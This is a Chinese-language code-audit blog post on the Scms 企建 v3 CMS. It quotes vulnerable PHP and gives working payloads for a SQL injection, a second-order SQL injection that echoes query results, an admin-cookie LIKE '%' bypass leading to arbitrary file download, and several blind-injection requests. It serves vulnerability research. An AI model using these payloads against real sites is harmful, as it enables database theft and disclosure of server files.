---
title: "Scms企建v3二次注入任意文件下载"
date: 2018-12-18T21:23:03+08:00
categories: ['代码审计']
tags: ['sql']
---

前天晚上学长发我的这套cms，研究了下挺有意思，记录下。

<!--more-->

### 普通注入一枚

漏洞文件：`\scms\bbs\bbs.php`

```php
$action=$_GET["action"];
$S_id=$_GET["S_id"];
if($action=="add"){
$B_title=htmlspecialchars($_POST["B_title"]);
$B_sort=$_POST["B_sort"];
$B_content=htmlspecialchars($_POST["B_content"]);
$S_sh=getrs("select * from SL_bsort where S_id=".intval($B_sort),"S_sh");
echo $B_sort;
if($S_sh==1){
$B_sh=0;
}else{
$B_sh=1;
}
mysqli_query($conn,"insert into SL_bbs(B_title,B_content,B_time,B_mid,B_sort,B_sh) values('".$B_title."','".$B_content."','".date('Y-m-d H:i:s')."',".$_SESSION["M_id"].",".$B_sort.",".$B_sh.")");
$sql="Select * from SL_bbs order by B_id desc limit 1";
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        $B_id=$row["B_id"];
    }
if($B_sh==1){
box("发布成功！","item.php?id=".$B_id,"success");
}else{
box("发布成功！请等待审核","./","success");
}
}
$_SESSION["from"]=$C_dir."bbs/bbs.php?S_id=".$S_id;
$sql="Select * from SL_slide order by S_id desc limit 1";
$result = mysqli_query($conn, $sql);
$row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
    if ($C_memberbg=="" || is_null($C_memberbg)){
    $S_pic=$row["S_pic"];
}else{
$S_pic=$C_memberbg;
}
    }
```

这个注入比较简单，首先需要注册登录拿到session，然后$B_sort无过滤直接从post中获取，虽然select查询用intval过滤了，但是后面的insert语句并没有过滤，构成注入。

payload

```http
http://127.0.0.1/scms/bbs/bbs.php?action=add

POST：B_title=test&B_content=test11&B_sort=1 and sleep(5)
```

![payload](https://y4er.com/img/uploads/20190509163061.jpg "payload")

### 二次注入

**先看一下漏洞触发点：**

```php
$sql="Select * from SL_bbs,SL_bsort,SL_member,SL_lv where B_sort=S_id and B_mid=M_id and M_lv=L_id and B_id=".$id;
    $result = mysqli_query($conn, $sql);
$row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
    $B_title=lang($row["B_title"]);
    $B_content=lang($row["B_content"]);
    $B_time=$row["B_time"];
    $B_sort=$row["B_sort"];
    $S_title=lang($row["S_title"]);
    $B_view=$row["B_view"];
    $M_login=$row["M_login"];
    $M_pic=$row["M_pic"];
    $L_title=$row["L_title"];
    }
if(substr($M_pic,0,4)!="http"){
$M_pic="../media/".$M_pic;
}
$sql2="Select count(*) as B_count from SL_bbs where B_sub=".$id;
$result2 = mysqli_query($conn, $sql2);
$row2 = mysqli_fetch_assoc($result2);
$B_count=$row2["B_count"];
if($action=="reply"){
$B_contentx=$_POST["B_content"];
$debug("insert into SL_bbs(B_title,B_content,B_time,B_mid,B_sub,B_sort) values('[回复]".$B_title."','".$B_contentx."','".date('Y-m-d H:i:s')."',".$_SESSION["M_id"].",".$id.",".$B_sort.")");
mysqli_query($conn,"insert into SL_bbs(B_title,B_content,B_time,B_mid,B_sub,B_sort) values('[回复]".$B_title."','".$B_contentx."','".date('Y-m-d H:i:s')."',".$_SESSION["M_id"].",".$id.",".$B_sort.")");
box("回复成功！","item.php?id=".$id,"success");

}
```

简单说一下逻辑，第一步执行的sql语句是查询帖子的详细内容（$id帖子id）

```php
$sql="Select * from SL_bbs,SL_bsort,SL_member,SL_lv where B_sort=S_id and B_mid=M_id and M_lv=L_id and B_id=".$id;
```

然后把查询到的内容各自赋给一个变量

```php
    $B_title=lang($row["B_title"]);

    $B_content=lang($row["B_content"]);

    $B_time=$row["B_time"];

    $B_sort=$row["B_sort"];

..............................
```

到后面判断`$action=="reply"`，进入回复帖子功能处

```php
if($action=="reply"){

$B_contentx=$_POST["B_content"];

$debug("insert into SL_bbs(B_title,B_content,B_time,B_mid,B_sub,B_sort) values('[回复]".$B_title."','".$B_contentx."','".date('Y-m-d H:i:s')."',".$_SESSION["M_id"].",".$id.",".$B_sort.")");

mysqli_query($conn,"insert into SL_bbs(B_title,B_content,B_time,B_mid,B_sub,B_sort) values('[回复]".$B_title."','".$B_contentx."','".date('Y-m-d H:i:s')."',".$_SESSION["M_id"].",".$id.",".$B_sort.")");

box("回复成功！","item.php?id=".$id,"success");

}
```

可以看到`$B_contentx=$_POST["B_content"]`无过滤，这里会触发储存xss漏洞。然而这个不是重点，继续看执行的insert语句，发现$B_title等变量都拼接了进来，没有sql过滤，而这些变量是从数据库查询出来的（帖子的标题等），然而回过头去看上面的sql注入，不就是发帖功能的地方么。所以这些变量可控，导致二次sql注入。

**漏洞触发流程：**

首先我们去发帖B_title的值是我们的payload，还有其他的值

`B_title=',(select user()),'',1,999,1)%23&B_content=aaaaaaaaaaaa&B_sort=1`

然后我们去获取帖子id，这个没有特别好的办法只能去摸索着找，可以先根据楼层判断一共有多少帖子，然后一点一点的往后找，根据内容判断是否是我们发布的帖子

```http
http://127.0.0.1//scms/bbs/item.php?id=帖子id
```

 

获取到帖子后去触发漏洞

```http
http://127.0.0.1//scms/bbs/item.php?action=reply&id=帖子id

B_content=test
```

 

这里我说一下payload为什么是这样的，这样构造完全是为了达到回显注入，因为后面打印回复内容的时候执行的sql注入是

```php
$sql="select * from SL_bbs where B_sub=".$id." order by B_id asc";
```

 

而B_sub可控（在Insert的时候插入的），这样我们就能直接获取回显。

**漏洞演示：**

Payload1

```php
http://127.0.0.1/scms/bbs/bbs.php?action=add

B_title=',(select user()),'',1,666,1)%23&B_content=hello_admin&B_sort=1
```

![Payload1](https://y4er.com/img/uploads/20190509161886.jpg "payload1")

Payload2

获取帖子id
```http
http://127.0.0.1//scms/bbs/item.php?id=30
```
![获取帖子id](https://y4er.com/img/uploads/20190509163613.jpg "获取帖子id")
Payload3

```http
http://127.0.0.1//scms/bbs/item.php?action=reply&id=30

B_content=test
```

![Payload3](https://y4er.com/img/uploads/20190509167478.jpg "Payload3")

执行完成！最后我们就可以去访问我们的回复然后拿到回显。
```http
http://127.0.0.1/scms/bbs/item.php?id=666
```

这次id参数指向的是我们填的B_sub值

![拿到回显](https://y4er.com/img/uploads/20190509167158.jpg "拿到回显")
### 任意文件下载
漏洞文件出现在`admin/download.php`
```php
<?php
require '../conn/conn2.php';
require '../conn/function.php';

if ($_COOKIE["user"]=="" || $_COOKIE["pass"]==""){
    setcookie("user","");
    setcookie("pass","");
    setcookie("auth","");
    Header("Location:index.php");
    die();
}else{
    $sql="select * from SL_admin where A_login like '".filter_keyword($_COOKIE["user"])."' and A_pwd like '".filter_keyword($_COOKIE["pass"])."'";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {

    }else{
        setcookie("user","");
        setcookie("pass","");
        setcookie("auth","");
        Header("Location:index.php");
        die();
    }
}


$DownName=$_GET["DownName"];
if(strpos($DownName,".php")!==false){
    die("禁止下载PHP格式文件！");
}

downtemplateAction($DownName);

function downtemplateAction($f){
    header("Content-type:text/html;charset=utf-8");
    $file_name = $f;
    $file_name = iconv("utf-8","gb2312",$file_name);
    $file_path=$file_name;
    if(!file_exists($file_path))
    {
        echo "下载文件不存在！";
        exit;
    }

    $fp=fopen($file_path,"r");
    $file_size=filesize($file_path);
    Header("Content-type: application/octet-stream");
    Header("Accept-Ranges: bytes");
    Header("Accept-Length:".$file_size);
    Header("Content-Disposition: attachment; filename=".$file_name);
    $buffer=1024;
    $file_count=0;
    while(!feof($fp) && $file_count<$file_size)
    {
        $file_con=fread($fp,$buffer);
        $file_count+=$buffer;
        echo $file_con;
    }
    fclose($fp);
}
?>
```
当cookie中设置了`user`和`pass`时，代码执行到12行：
```php
$sql="select * from SL_admin where A_login like '".filter_keyword($_COOKIE["user"])."' and A_pwd like '".filter_keyword($_COOKIE["pass"])."'";
```
去数据库中查询`user`和`pass`是否正确，我第一次想到是这里存在注入，经过尝试发现参数已经被过滤了。
再看sql语句发现判断`user`和`pass`是否正确时，用的`like`而不是`=`,如果将`user`和`pass`都设置成`%`，sql语句就变成了：
```php
sql="select * from SL_admin where A_login like '%' and A_pwd like '%'";
```
这样可以从数据库中查到记录，进而绕过登录。

继续查看27-30行代码：
```php
$DownName=$_GET["DownName"];
if(strpos($DownName,".php")!==false){
    die("禁止下载PHP格式文件！");
}
```
发现不允许下载后缀名为php的文件，这里只需要将php用大写替换即可，比如：`Php`

最后的payload为：
注意`cookie`中的内容
![任意文件下载](https://y4er.com/img/uploads/20190509160733.jpg "任意文件下载")

### 总结
scm还有多处sql注入漏洞：

```http
http://127.0.0.1/scms/wap_index.php?type=newsinfo&S_id=112489097%20or%20ascii(substr(user(),1,1))=114
```
```http
http://127.0.0.1/scms/js/pic.php?P_id=10440322488%20or%20ascii(substr(user(),1,1))=113
```
```http
POST /scms/js/scms.php?action=comment HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Cookie: authorization=fail; authorization4=1MHwwfHMxMXx3MXx4M3x4MTF8; PHPSESSID=7f1d23f4v12cp323fh6osb9v36; __typecho_lang=zh_CN; __tins__19608037=%7B%22sid%22%3A%201543394079021%2C%20%22vd%22%3A%2012%2C%20%22expires%22%3A%201543396066537%7D; __51cke__=; __51laig__=12; CmsCode=eijb
Connection: close
Upgrade-Insecure-Requests: 1

page=aaaaa11' or if(substr(user(),1,1)='r',sleep(5),1) --+
```

### 参考链接

https://xz.aliyun.com/t/3614

https://www.cnblogs.com/ashe666/archive/2018/12/10/10094706.html